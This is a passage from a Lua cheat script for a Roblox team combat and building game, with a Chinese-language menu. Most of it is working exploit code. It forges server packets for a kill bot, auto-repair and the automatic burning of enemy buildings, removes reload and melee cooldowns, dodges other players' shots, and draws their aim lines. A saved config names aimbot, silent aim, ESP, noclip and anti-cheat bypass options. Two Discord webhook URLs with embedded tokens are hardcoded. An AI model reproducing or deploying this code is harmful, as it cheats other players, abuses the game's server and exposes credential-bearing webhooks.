        WindUI:Notify({ Title = "高亮", Content = "已关闭", Duration = 2 })
    end
end

function copyToClipboard(text)
    local success, err = pcall(function()
        if setclipboard then
            setclipboard(text)
        elseif toclipboard then
            toclipboard(text)
        elseif syn and syn.set_clipboard then
            syn.set_clipboard(text)
        else
            local gui = Instance.new("ScreenGui")
            local textBox = Instance.new("TextBox")
            textBox.Size = UDim2.new(0, 0, 0, 0)
            textBox.Text = text
            textBox.Parent = gui
            gui.Parent = CoreGui
            textBox:CaptureFocus()
            textBox:ReleaseFocus()
            gui:Destroy()
            error("请使用支持剪贴板的执行器")
        end
    end)
    if not success then
        WindUI:Notify({ Title = "复制失败", Content = "请使用支持剪贴板的执行器", Duration = 3 })
    else
        WindUI:Notify({ Title = "复制成功", Content = "已复制: " .. text, Duration = 2 })
    end
end

function isEnemy(plr)
    if plr == localPlayer then return false end
    if localPlayer.Team and plr.Team then return localPlayer.Team ~= plr.Team end
    if localPlayer.TeamColor and plr.TeamColor then return localPlayer.TeamColor ~= plr.TeamColor end
    local myTeam = localPlayer:GetAttribute("Team") or localPlayer:GetAttribute("Faction")
    local otherTeam = plr:GetAttribute("Team") or plr:GetAttribute("Faction")
    if myTeam and otherTeam then return myTeam ~= otherTeam end
    return true
end

function isTeammate(plr)
    return plr == localPlayer or not isEnemy(plr)
end

function isEnemyVisible(part)
    if not part then return false end
    local char = localPlayer.Character
    if not char then return false end
    local cam = workspace.CurrentCamera
    if not cam then return false end
    local origin = cam.CFrame.Position
    local direction = (part.Position - origin)
    local dist = direction.Magnitude
    if dist < 0.1 then return true end
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    params.FilterDescendantsInstances = {char, part.Parent}
    local result = workspace:Raycast(origin, direction.Unit * dist, params)
    return not result
end

function getPlayerColor(plr)
    if plr == localPlayer then return Color3.fromRGB(0, 255, 0) end
    if isTeammate(plr) then return Color3.fromRGB(0, 0, 255) else return Color3.fromRGB(255, 0, 0) end
end

function findNearestEnemy()
    local char = localPlayer.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local best, bestDist = nil, math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer and isEnemy(p) and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            local eRoot = p.Character:FindFirstChild("HumanoidRootPart")
            if hum and hum.Health > 0 and eRoot then
                local d = (root.Position - eRoot.Position).Magnitude
                if d < bestDist then
                    bestDist = d
                    best = p
                end
            end
        end
    end
    return best
end

function isEnemyBuilding(building)
    local ownerVal = building:FindFirstChild("Owner")
    if ownerVal then
        if ownerVal:IsA("StringValue") then
            local ownerPlayer = Players:FindFirstChild(ownerVal.Value)
            if ownerPlayer then return isEnemy(ownerPlayer) end
        elseif ownerVal:IsA("ObjectValue") and ownerVal.Value and ownerVal.Value:IsA("Player") then
            return isEnemy(ownerVal.Value)
        end
    end
    local teamVal = building:FindFirstChild("Team")
    if teamVal then
        if teamVal:IsA("StringValue") then
            local targetTeam = teamVal.Value
            local myTeam = localPlayer.Team and localPlayer.Team.Name
            if myTeam and targetTeam then return myTeam ~= targetTeam end
        elseif teamVal:IsA("ObjectValue") and teamVal.Value and teamVal.Value:IsA("Team") then
            return teamVal.Value ~= localPlayer.Team
        end
    end
    for _, plr in ipairs(Players:GetPlayers()) do
        if isEnemy(plr) and building.Name:find(plr.Name) then return true end
    end
    return false
end

function smartSend(hitType, tool, target)
    local success, packets = pcall(function() return require(ReplicatedStorage.REFERENCES.PacketReference) end)
    if not success then return end
    for k, v in pairs(packets) do
        if type(v) == "table" and v.send and tostring(k):lower():find("me") then
            pcall(function()
                v.send({ Type = hitType, Tool = tool, hitInstance = target, knockbackOrigin = Vector3.zero, knockbackDirection = Vector3.zero })
            end)
        end
    end
end

function sendHttpRequest(url, data)
    local http = game:GetService("HttpService")
    local jsonData = http:JSONEncode(data)
    if syn and syn.request then
        syn.request({ Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData })
        return true
    elseif request then
        request({ Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData })
        return true
    else
        pcall(function() http:PostAsync(url, jsonData, Enum.HttpContentType.ApplicationJson, false) end)
        return true
    end
end

bugWebhookUrl = "https://discord.com/api/webhooks/1505499593960329316/Nqm6H-aB9pxG5DhoXwEQQn9MTr1yj9sucHzxOd0H0DwnaBXyhHHMdCWxTLPEZaxvoZb0"
serviceWebhookUrl = "https://discord.com/api/webhooks/1507548257507610756/No_EQTIozUb0pAXzjE-Ng6SBZs-P1ZgACL0mSHPNSj47RC7pE6Mi7vr3jzfLVs7tG3zF"
lastBugFeedback = 0
lastServiceFeedback = 0

_G.NEX_LC_VARS.friendList = {}

_G.NEX_LC_VARS.autoReloadEnabled = false
_G.NEX_LC_VARS.autoReloadConnection = nil

function doFastReload()
    local char = localPlayer.Character
    if not char then return end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") then
            local ammo = tool:FindFirstChild("Ammo")
            local maxAmmo = tool:FindFirstChild("MaxAmmo") or tool:FindFirstChild("ClipSize")
            if ammo and maxAmmo then ammo.Value = maxAmmo.Value end
            local reloading = tool:FindFirstChild("Reloading")
            if reloading then reloading.Value = false end
            local cfg = tool:FindFirstChild("Configuration")
            if cfg then
                local cfgAmmo = cfg:FindFirstChild("Ammo")
                local cfgMax = cfg:FindFirstChild("MaxAmmo") or cfg:FindFirstChild("ClipSize")
                if cfgAmmo and cfgMax then cfgAmmo.Value = cfgMax.Value end
                local cfgReload = cfg:FindFirstChild("Reloading")
                if cfgReload then cfgReload.Value = false end
            end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
                    if track.Animation and track.Animation.Name:lower():find("reload") then track:Stop() end
                end
            end
        end
    end
end

function updateAutoReload()
    if _G.NEX_LC_VARS.autoReloadEnabled then
        if not _G.NEX_LC_VARS.autoReloadConnection then
            _G.NEX_LC_VARS.autoReloadConnection = RunService.Heartbeat:Connect(doFastReload)
        end
    else
        if _G.NEX_LC_VARS.autoReloadConnection then
            _G.NEX_LC_VARS.autoReloadConnection:Disconnect()
            _G.NEX_LC_VARS.autoReloadConnection = nil
        end
    end
end

function manualReload()
    doFastReload()
    WindUI:Notify({ Title = "快速换弹", Content = "已手动换弹", Duration = 1 })
end

_G.NEX_LC_VARS.autoRepairEnabled = false
_G.NEX_LC_VARS.repairRange = 15
_G.NEX_LC_VARS.repairSpeed = 0.05
_G.NEX_LC_VARS.repairConn = nil
_G.NEX_LC_VARS.repairLast = 0

repairHammerNames = {"Hammer", "Claw Hammer"}

function findRepairHammer()
    local char = localPlayer.Character
    if not char then return nil end
    for _, name in ipairs(repairHammerNames) do
        local tool = char:FindFirstChild(name)
        if tool then return tool end
    end
    return nil
end

function getPlayerPos()
    local char = localPlayer.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    return root and root.Position
end

function getBuildingsContainer()
    for _, name in ipairs({"BuildingsContainer", "Buildings", "Structures", "Constructions"}) do
        local container = Workspace:FindFirstChild(name)
        if container then return container end
    end
    return nil
end

function doAutoRepair()
    if not _G.NEX_LC_VARS.autoRepairEnabled then return end
    local pos = getPlayerPos()
    if not pos then return end
    local tool = findRepairHammer()
    if not tool then return end
    pcall(function() tool:SetAttribute("Repair", false) end)
    local repairVal = tool:FindFirstChild("Repair")
    if not repairVal then
        repairVal = Instance.new("BoolValue")
        repairVal.Name = "Repair"
        repairVal.Value = false
        repairVal.Parent = tool
    end
    local container = getBuildingsContainer()
    if not container then return end
    local closestBuilding = nil
    local closestDist = _G.NEX_LC_VARS.repairRange + 1
    for _, building in ipairs(container:GetChildren()) do
        if building:IsA("Model") then
            local buildingPos
            if building.PrimaryPart then
                buildingPos = building.PrimaryPart.Position
            else
                for _, part in ipairs(building:GetDescendants()) do
                    if part:IsA("BasePart") then
                        buildingPos = part.Position
                        break
                    end
                end
            end
            if buildingPos then
                local dist = (pos - buildingPos).Magnitude
                if dist < closestDist then
                    closestDist = dist
                    closestBuilding = building
                end
            end
        end
    end
    if not closestBuilding then return end
    local now = os.clock()
    if now - _G.NEX_LC_VARS.repairLast < _G.NEX_LC_VARS.repairSpeed then return end
    _G.NEX_LC_VARS.repairLast = now
    repairVal.Value = true
    local success, packets = pcall(function() return require(ReplicatedStorage.REFERENCES.PacketReference) end)
    if success and packets and packets.RepairConstruct then
        pcall(function() packets.RepairConstruct.send({tool = tool, construct = closestBuilding, isRepairing = true}) end)
    end
    repairVal.Value = false
end

function updateAutoRepair()
    if _G.NEX_LC_VARS.autoRepairEnabled then
        if not _G.NEX_LC_VARS.repairConn then
            _G.NEX_LC_VARS.repairConn = RunService.Heartbeat:Connect(doAutoRepair)
        end
    else
        if _G.NEX_LC_VARS.repairConn then
            _G.NEX_LC_VARS.repairConn:Disconnect()
            _G.NEX_LC_VARS.repairConn = nil
        end
    end
end

_G.NEX_LC_VARS.burnEnabled = false
_G.NEX_LC_VARS.burnRange = 30
_G.NEX_LC_VARS.burnConn = nil

function igniteBuilding(tool, building)
    local success, packets = pcall(function() return require(ReplicatedStorage.REFERENCES.PacketReference) end)
    if success and packets and packets.IgniteConstructs and packets.IgniteConstructs.send then
        pcall(function() packets.IgniteConstructs.send({tool = tool, construct = building}) end)
    else
        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") and (obj.Name:lower():find("ignite") or obj.Name:lower():find("burn")) then
                pcall(function() obj:FireServer(tool, building) end)
                break
            end
        end
    end
end

function doBurnBuildings()
    if not _G.NEX_LC_VARS.burnEnabled then return end
    local char = localPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool then return end
    local buildings = Workspace:FindFirstChild("BuildingsContainer") or Workspace:FindFirstChild("Structures") or Workspace
    if not buildings then return end
    for _, building in ipairs(buildings:GetChildren()) do
        if building:IsA("Model") and isEnemyBuilding(building) then
            local part = building:FindFirstChild("Invis") or building:FindFirstChild("Hitbox") or building.PrimaryPart or building:FindFirstChildWhichIsA("BasePart")
            if part and part:IsA("BasePart") and (root.Position - part.Position).Magnitude <= _G.NEX_LC_VARS.burnRange then
                igniteBuilding(tool, building)
            end
        end
    end
end

function updateBurn()
    if _G.NEX_LC_VARS.burnEnabled then
        if not _G.NEX_LC_VARS.burnConn then
            _G.NEX_LC_VARS.burnConn = RunService.Heartbeat:Connect(doBurnBuildings)
        end
    else
        if _G.NEX_LC_VARS.burnConn then
            _G.NEX_LC_VARS.burnConn:Disconnect()
            _G.NEX_LC_VARS.burnConn = nil
        end
    end
end

_G.NEX_LC_VARS.fastMeleeEnabled = false
_G.NEX_LC_VARS.fastMeleeConn = nil

function startFastMelee()
    if _G.NEX_LC_VARS.fastMeleeConn then _G.NEX_LC_VARS.fastMeleeConn:Disconnect() end
    _G.NEX_LC_VARS.fastMeleeConn = RunService.Heartbeat:Connect(function()
        if not _G.NEX_LC_VARS.fastMeleeEnabled then return end
        local char = localPlayer.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then return end
        pcall(function()
            local cd = tool:FindFirstChild("Cooldown") or tool:FindFirstChild("SwingCooldown")
            if cd and cd:IsA("NumberValue") then cd.Value = cd.Value / 3 end
        end)
        pcall(function()
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
                    if track.Animation and (track.Animation.Name:lower():find("swing") or track.Animation.Name:lower():find("slash") or track.Animation.Name:lower():find("melee")) then
                        track:AdjustSpeed(3)
                    end
                end
            end
        end)
    end)
end

function updateFastMelee()
    if _G.NEX_LC_VARS.fastMeleeEnabled then
        startFastMelee()
    else
        if _G.NEX_LC_VARS.fastMeleeConn then
            _G.NEX_LC_VARS.fastMeleeConn:Disconnect()
            _G.NEX_LC_VARS.fastMeleeConn = nil
        end
    end
end

_G.NEX_LC_VARS.fastReload2Enabled = false
_G.NEX_LC_VARS.fastReload2Conn = nil

function startFastReload2()
    if _G.NEX_LC_VARS.fastReload2Conn then _G.NEX_LC_VARS.fastReload2Conn:Disconnect() end
    _G.NEX_LC_VARS.fastReload2Conn = RunService.Heartbeat:Connect(function()
        if not _G.NEX_LC_VARS.fastReload2Enabled then return end
        local char = localPlayer.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then return end
        pcall(function()
            local rt = tool:FindFirstChild("ReloadTime")
            if rt and rt:IsA("NumberValue") then rt.Value = rt.Value / 2 end
        end)
        pcall(function()
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
                    if track.Animation and track.Animation.Name:lower():find("reload") then
                        track:AdjustSpeed(2)
                    end
                end
            end
        end)
    end)
end

function updateFastReload2()
    if _G.NEX_LC_VARS.fastReload2Enabled then
        startFastReload2()
    else
        if _G.NEX_LC_VARS.fastReload2Conn then
            _G.NEX_LC_VARS.fastReload2Conn:Disconnect()
            _G.NEX_LC_VARS.fastReload2Conn = nil
        end
    end
end

local aimTracerConn = nil
local aimTracerObjects = {}

function createTracer(startPos, direction, length, color, duration, source)
    color = color or Color3.fromRGB(0, 255, 0)
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    if source and source.Character then
        params.FilterDescendantsInstances = {source.Character}
    else
        params.FilterDescendantsInstances = {}
    end
    local ray = Workspace:Raycast(startPos, direction.Unit * length, params)
    local endPos = startPos + direction.Unit * length
    if ray then
        endPos = ray.Position
    end

    local folder = Workspace:FindFirstChild("TracerLines")
    if not folder then
        folder = Instance.new("Folder")
        folder.Name = "TracerLines"
        folder.Parent = Workspace
    end
    local part = Instance.new("Part")
    part.Size = Vector3.one
    part.Anchored = true
    part.CanCollide = false
    part.Transparency = 1
    part.Parent = folder

    local att1 = Instance.new("Attachment")
    att1.Parent = part
    local att2 = Instance.new("Attachment")
    att2.Parent = part

    local beam = Instance.new("Beam")
    beam.Attachment0 = att1
    beam.Attachment1 = att2
    beam.Width0 = 0.8
    beam.Width1 = 0.8
    beam.Transparency = NumberSequence.new(0.3)
    beam.Color = ColorSequence.new(color)
    beam.Parent = part

    part.CFrame = CFrame.new(startPos)
    att2.Position = endPos - startPos

    beam.Enabled = true

    if (bulletDodgeEnabled or bulletDodge2Enabled) and source then
        local actualLen = (endPos - startPos).Magnitude
        table.insert(recentRays, {start=startPos, dir=direction.Unit, len=actualLen, source=source, time=os.clock()})
        if #recentRays > 30 then table.remove(recentRays, 1) end
    end

    task.delay(duration or 1.5, function()
        pcall(function()
            part:Destroy()
        end)
    end)
    return part
end

function toggleRemoteEventTracker(state)
    remoteEventTrackerEnabled = state
    for _, obj in ipairs(aimTracerObjects) do
        pcall(function() obj:Destroy() end)
    end
    aimTracerObjects = {}
    if aimTracerConn then
        aimTracerConn:Disconnect()
        aimTracerConn = nil
    end

    if not state then
        WindUI:Notify({ Title = "显示他人预瞄点", Content = "已关闭", Duration = 2 })
        return
    end

    aimTracerConn = RunService.RenderStepped:Connect(function()
        if not remoteEventTrackerEnabled then return end
        for _, obj in ipairs(aimTracerObjects) do
            pcall(function() obj:Destroy() end)
        end
        aimTracerObjects = {}

        local localChar = localPlayer.Character
        if not localChar then return end
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr == localPlayer then continue end
            if not isEnemy(plr) then continue end
            local char = plr.Character
            if not char then return end
            if not hasTool(char) then continue end
            local head = char:FindFirstChild("Head")
            if not head then continue end
            local look = head.CFrame.LookVector
            if look.Magnitude < 0.1 then continue end
            local startPos = head.Position + look * 1.5
            local tracer = createTracer(startPos, look, 5000, nil, 0.1, plr)
            if tracer then table.insert(aimTracerObjects, tracer) end
        end
    end)
    WindUI:Notify({ Title = "显示他人预瞄点", Content = "已开启（仅持有武器者）", Duration = 2 })
end

local recentRays = {}
local bulletDodgeEnabled = false
local bulletDodge2Enabled = false
local dodgeConn = nil

function isRayHitMe(rayStart, rayDir, rayLen, sourcePlayer)
    if sourcePlayer and not isEnemy(sourcePlayer) then
        return false
    end
    local char = localPlayer.Character
    if not char then return false end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return false end
    local origin = root.Position
    local toOrigin = origin - rayStart
    local proj = toOrigin:Dot(rayDir)
    if proj < 0 or proj > rayLen then return false end
    local closest = rayStart + rayDir * proj
    if (closest - origin).Magnitude < 4 then
        return true
    end
    return false
end

function performDodge()
    if not (bulletDodgeEnabled or bulletDodge2Enabled) then return end
    local char = localPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    local currentTime = os.clock()
    for i = #recentRays, 1, -1 do
        local ray = recentRays[i]
        if currentTime - ray.time > 0.5 then table.remove(recentRays, i) else
            if isRayHitMe(ray.start, ray.dir, ray.len, ray.source) then
                local dodgeDir = Vector3.new(-ray.dir.Z, 0, ray.dir.X).Unit
                if dodgeDir.Magnitude < 0.1 then dodgeDir = Vector3.new(1,0,0) end
                local speed = 80
                if bulletDodge2Enabled then
                    hum.PlatformStand = true
                    root.AssemblyAngularVelocity = Vector3.new(100, 100, 100)
                    root.AssemblyLinearVelocity = dodgeDir * speed + Vector3.new(0, 20, 0)
                    local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
                    if torso then
                        torso.AssemblyLinearVelocity = dodgeDir * speed * 0.5 + Vector3.new(0, 10, 0)
                    end
                else
                    root.AssemblyLinearVelocity = dodgeDir * speed + Vector3.new(0, 5, 0)
                end
                table.remove(recentRays, i)
                break
            end
        end
    end
end

function updateDodge()
    if bulletDodgeEnabled or bulletDodge2Enabled then
        if not dodgeConn then
            dodgeConn = RunService.Heartbeat:Connect(performDodge)
        end
    else
        if dodgeConn then
            dodgeConn:Disconnect()
            dodgeConn = nil
        end
    end
end

_G.NEX_LC_VARS.killBotEnabled = false
_G.NEX_LC_VARS.killBotRange = 5
_G.NEX_LC_VARS.killBotCD = 0.1
_G.NEX_LC_VARS.killBotConn = nil
_G.NEX_LC_VARS.killBotLast = 0
local botCache = {}
local lastCacheUpdate = 0

function updateBotCache()
    botCache = {}
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v:FindFirstChild("Head") then
            if not Players:GetPlayerFromCharacter(v) then
                local hum = v:FindFirstChildOfClass("Humanoid")
                local hrp = v:FindFirstChild("HumanoidRootPart")
                local head = v:FindFirstChild("Head")
                if hum and hum.Health > 0 and hrp and head then
                    table.insert(botCache, {
                        Character = v,
                        Head = head,
                        Hrp = hrp,
                        Humanoid = hum
                    })
                end
            end
        end
    end
end

function getClosestBot()
    local char = localPlayer.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    if os.clock() - lastCacheUpdate > 2 then
        updateBotCache()
        lastCacheUpdate = os.clock()
    end
    local best, bestDist = nil, _G.NEX_LC_VARS.killBotRange
    for _, bot in ipairs(botCache) do
        if bot.Humanoid and bot.Humanoid.Health > 0 and bot.Hrp and bot.Hrp.Parent then
            local d = (root.Position - bot.Hrp.Position).Magnitude
            if d < bestDist then
                bestDist = d
                best = bot
            end
        end
    end
    return best
end

function attackBot(target)
    local char = localPlayer.Character
    if not char then return end
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool then return end
    local packets = require(ReplicatedStorage.REFERENCES.PacketReference)
    for k, v in pairs(packets) do
        if type(v) == "table" and v.send then
            local name = tostring(k):lower()
            if name:find("me") then
                pcall(function()
                    v.send({
                        Type = "Humanoid",
                        Tool = tool,
                        hitInstance = target.Head
                    })
                end)
            end
        end
    end
end

function doKillBot()
    if not _G.NEX_LC_VARS.killBotEnabled then return end
    local target = getClosestBot()
    if not target then return end
    local now = os.clock()
    if now - _G.NEX_LC_VARS.killBotLast >= _G.NEX_LC_VARS.killBotCD then
        _G.NEX_LC_VARS.killBotLast = now
        attackBot(target)
    end
end

function updateKillBot()
    if _G.NEX_LC_VARS.killBotEnabled then
        if not _G.NEX_LC_VARS.killBotConn then
            _G.NEX_LC_VARS.killBotConn = RunService.Heartbeat:Connect(doKillBot)
        end
    else
        if _G.NEX_LC_VARS.killBotConn then
            _G.NEX_LC_VARS.killBotConn:Disconnect()
            _G.NEX_LC_VARS.killBotConn = nil
        end
    end
end

configFolder = "NEX_LC_Data"

function saveConfig(name)
    local config = {}
    config.manualHitEnabled = _G.NEX_LC_VARS.manualHitEnabled or false
    config.hitCount = _G.NEX_LC_VARS.hitCount or 3
    config.hitDelay = _G.NEX_LC_VARS.hitDelay or 0.08
    config.manualRange = _G.NEX_LC_VARS.manualRange or 45
    config.manualFOV = _G.NEX_LC_VARS.manualFOV or 180
    config.killAuraEnabled = _G.NEX_LC_VARS.killAuraEnabled or false
    config.killAuraAllowEmptyHand = _G.NEX_LC_VARS.killAuraAllowEmptyHand or false
    config.attackRange = _G.NEX_LC_VARS.attackRange or 5
    config.attackCD = _G.NEX_LC_VARS.attackCD or 0.1
    config.breakBuildingsEnabled = _G.NEX_LC_VARS.breakBuildingsEnabled or false
    config.noFallEnabled = _G.NEX_LC_VARS.noFallEnabled or false
    config.aimbotEnabled = _G.NEX_LC_VARS.aimbotEnabled or false
    config.aimHead = _G.NEX_LC_VARS.aimHead or false
    config.aimRange = _G.NEX_LC_VARS.aimRange or 300
    config.aimSmooth = _G.NEX_LC_VARS.aimSmooth or 0.5
    config.silentAimEnabled = _G.NEX_LC_VARS.silentAimEnabled or false
    config.silentFovEnabled = _G.NEX_LC_VARS.silentFovEnabled or false
    config.wallCheckEnabled = _G.NEX_LC_VARS.wallCheckEnabled or false
    config.ragebotEnabled = _G.NEX_LC_VARS.ragebotEnabled or false
    config.rageInterval = _G.NEX_LC_VARS.rageInterval or 6.0
    config.rageTargetPart = _G.NEX_LC_VARS.rageTargetPart or "Head"
    config.rageWallCheck = _G.NEX_LC_VARS.rageWallCheck or false
    config.rageSpecificTarget = _G.NEX_LC_VARS.rageSpecificTarget or ""
    config.rageWhitelist = _G.NEX_LC_VARS.rageWhitelist or ""
    config.espEnabled = _G.NEX_LC_VARS.espEnabled or false
    config.espShowDots = _G.NEX_LC_VARS.espShowDots or true
    config.espShowNames = _G.NEX_LC_VARS.espShowNames or true
    config.espShowBots = _G.NEX_LC_VARS.espShowBots or true
    config.espShowTracers = _G.NEX_LC_VARS.espShowTracers or true
    config.espWallCheck = _G.NEX_LC_VARS.espWallCheck or true
    config.espOutlineEnabled = _G.NEX_LC_VARS.espOutlineEnabled or false
    config.bodyCenterTPEnabled = _G.NEX_LC_VARS.bodyCenterTPEnabled or false
    config.autoMarkEnabled = _G.NEX_LC_VARS.autoMarkEnabled or false
    config.noclipEnabled = _G.NEX_LC_VARS.noclipEnabled or false
    config.speedEnabled = _G.NEX_LC_VARS.speedEnabled or false
    config.currentSpeed = _G.NEX_LC_VARS.currentSpeed or 16
    config.noSlowEnabled = _G.NEX_LC_VARS.noSlowEnabled or false
    config.spinEnabled = _G.NEX_LC_VARS.spinEnabled or false
    config.spinSpeed = _G.NEX_LC_VARS.spinSpeed or 0
    config.perfMode = _G.NEX_LC_VARS.perfMode or false
    config.autoReloadEnabled = _G.NEX_LC_VARS.autoReloadEnabled or false
    config.friendList = _G.NEX_LC_VARS.friendList or {}
    config.ultraFOVEnabled = _G.NEX_LC_VARS.ultraFOVEnabled or false
    config.fovValue = _G.NEX_LC_VARS.fovValue or 120
    config.autoRepairEnabled = _G.NEX_LC_VARS.autoRepairEnabled or false
    config.repairRange = _G.NEX_LC_VARS.repairRange or 15
    config.repairSpeed = _G.NEX_LC_VARS.repairSpeed or 0.05
    config.bringAllEnabled = _G.NEX_LC_VARS.bringAllEnabled or false
    config.hookBypassEnabled = _G.NEX_LC_VARS.hookBypassEnabled or false
    config.burnEnabled = _G.NEX_LC_VARS.burnEnabled or false
    config.burnRange = _G.NEX_LC_VARS.burnRange or 30
    config.showTracers = _G.NEX_LC_VARS.showTracers or false
    config.esp2Enabled = _G.NEX_LC_VARS.esp2Enabled or false
    config.unlockFOVEnabled = _G.NEX_LC_VARS.unlockFOVEnabled or false
    config.noClipCamEnabled = _G.NEX_LC_VARS.noClipCamEnabled or false
    config.remoteEventTrackerEnabled = remoteEventTrackerEnabled or false
    config.fastMeleeEnabled = _G.NEX_LC_VARS.fastMeleeEnabled or false
    config.bigHeadEnabled = _G.NEX_LC_VARS.bigHeadEnabled or false
    config.autoBlockEnabled = _G.NEX_LC_VARS.autoBlockEnabled or false
    config.desyncEnabled = _G.NEX_LC_VARS.desyncEnabled or false
    config.maxAttackCount = _G.NEX_LC_VARS.maxAttackCount or 1
    config.homelandLaserEnabled = _G.NEX_LC_VARS.homelandLaserEnabled or false
    config.speedThresholdEnabled = speedThresholdEnabled or false
    config.highlightEnabled = highlightEnabled or false
    config.useLightsaber = useLightsaber or false
    config.pickupPlayer = pickupPlayer or false
    config.sourceWeapon = sourceWeapon or "军刀"
    config.autoChargeEnabled = _G.NEX_LC_VARS.autoChargeEnabled or false
    config.lockBots = lockBots or true
    config.ESP_Enabled = _G.NEX_LC_VARS.ESP_Enabled or false
    config.ESP_Boxes = _G.NEX_LC_VARS.ESP_Boxes or false
    config.ESP_Names = _G.NEX_LC_VARS.ESP_Names or false
    config.ESP_Distance = _G.NEX_LC_VARS.ESP_Distance or false
    config.ESP_Tracers = _G.NEX_LC_VARS.ESP_Tracers or false
    config.ESP_AimLine = _G.NEX_LC_VARS.ESP_AimLine or false
    config.ESP_TeamCheck = _G.NEX_LC_VARS.ESP_TeamCheck or false
    config.ESP_Outline = _G.NEX_LC_VARS.ESP_Outline or false
    config.undergroundEnabled = _G.NEX_LC_VARS.undergroundEnabled or false
    config.teleportBehindEnabled = _G.NEX_LC_VARS.teleportBehindEnabled or false
    config.teleportBehindActive = _G.NEX_LC_VARS.teleportBehindActive or false
    config.teleportBehindContinuous = _G.NEX_LC_VARS.teleportBehindContinuous or false
    config.flyCameraSpeed = flyCameraSpeed or 40
    config.flyCameraSensitivity = flyCameraSensitivity or 0.3
    config.selectedMeshPreset = selectedMeshPreset or nil
    config.customThemeEnabled = customThemeEnabled or false
    config.currentLanguage = WindUI.CurrentLanguage or "zh-cn"
    local json = HttpService:JSONEncode(config)
    local success, err = pcall(function()
        if isfolder and not isfolder(configFolder) then
            makefolder(configFolder)
        end
        writefile(configFolder .. "/" .. name .. ".json", json)
    end)
    if success then
        WindUI:Notify({ Title = "配置保存", Content = "已保存: " .. name, Duration = 2 })
    else
        WindUI:Notify({ Title = "保存失败", Content = err or "未知错误", Duration = 3 })
    end
end

function loadConfig(name)
    local path = configFolder .. "/" .. name .. ".json"
    local content = nil
    local success, err = pcall(function()
        content = readfile(path)
    end)
    if not success or not content then
        WindUI:Notify({ Title = "加载失败", Content = "文件不存在", Duration = 2 })
        return
    end
    local decodeSuccess, config = pcall(function() return HttpService:JSONDecode(content) end)
    if not decodeSuccess or not config then
        WindUI:Notify({ Title = "加载失败", Content = "配置文件损坏", Duration = 2 })
        return
    end

    _G.NEX_LC_VARS.manualHitEnabled = config.manualHitEnabled or false
    _G.NEX_LC_VARS.hitCount = config.hitCount or 3
    _G.NEX_LC_VARS.hitDelay = config.hitDelay or 0.08
    _G.NEX_LC_VARS.manualRange = config.manualRange or 45
    _G.NEX_LC_VARS.manualFOV = config.manualFOV or 180
    _G.NEX_LC_VARS.killAuraEnabled = config.killAuraEnabled or false
    _G.NEX_LC_VARS.killAuraAllowEmptyHand = config.killAuraAllowEmptyHand or false
    _G.NEX_LC_VARS.attackRange = config.attackRange or 5
    _G.NEX_LC_VARS.attackCD = config.attackCD or 0.1
    _G.NEX_LC_VARS.breakBuildingsEnabled = config.breakBuildingsEnabled or false
    _G.NEX_LC_VARS.noFallEnabled = config.noFallEnabled or false
    _G.NEX_LC_VARS.aimbotEnabled = config.aimbotEnabled or false
    _G.NEX_LC_VARS.aimHead = config.aimHead or false
    _G.NEX_LC_VARS.aimRange = config.aimRange or 300
    _G.NEX_LC_VARS.aimSmooth = config.aimSmooth or 0.5
    _G.NEX_LC_VARS.silentAimEnabled = config.silentAimEnabled or false
    _G.NEX_LC_VARS.silentFovEnabled = config.silentFovEnabled or false
    _G.NEX_LC_VARS.wallCheckEnabled = config.wallCheckEnabled or false
    _G.NEX_LC_VARS.ragebotEnabled = config.ragebotEnabled or false
    _G.NEX_LC_VARS.rageInterval = config.rageInterval or 6.0
    _G.NEX_LC_VARS.rageTargetPart = config.rageTargetPart or "Head"
    _G.NEX_LC_VARS.rageWallCheck = config.rageWallCheck or false
    _G.NEX_LC_VARS.rageSpecificTarget = config.rageSpecificTarget or ""
    _G.NEX_LC_VARS.rageWhitelist = config.rageWhitelist or ""
    _G.NEX_LC_VARS.espEnabled = config.espEnabled or false
    _G.NEX_LC_VARS.espShowDots = config.espShowDots or true
    _G.NEX_LC_VARS.espShowNames = config.espShowNames or true
    _G.NEX_LC_VARS.espShowBots = config.espShowBots or true
    _G.NEX_LC_VARS.espShowTracers = config.espShowTracers or true
    _G.NEX_LC_VARS.espWallCheck = config.espWallCheck or true
    _G.NEX_LC_VARS.espOutlineEnabled = config.espOutlineEnabled or false
    _G.NEX_LC_VARS.bodyCenterTPEnabled = config.bodyCenterTPEnabled or false
    _G.NEX_LC_VARS.autoMarkEnabled = config.autoMarkEnabled or false
    _G.NEX_LC_VARS.noclipEnabled = config.noclipEnabled or false
    _G.NEX_LC_VARS.speedEnabled = config.speedEnabled or false
